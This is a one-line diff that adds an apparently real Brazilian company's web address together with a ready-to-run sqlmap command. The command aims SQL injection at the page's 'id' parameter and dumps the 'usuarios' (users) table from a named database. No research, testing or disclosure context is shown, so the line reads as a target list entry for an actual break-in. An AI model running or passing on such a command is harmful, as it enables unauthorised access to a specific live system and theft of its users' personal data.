@@ -1,0 +1,1 @@
+https://www.desentupidoradetecta.com.br/bnr_conta_click.php?id=8 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.desentupidoradetecta.com.br/bnr_conta_click.php?id=8 -D desentup_bd -T usuarios --dump
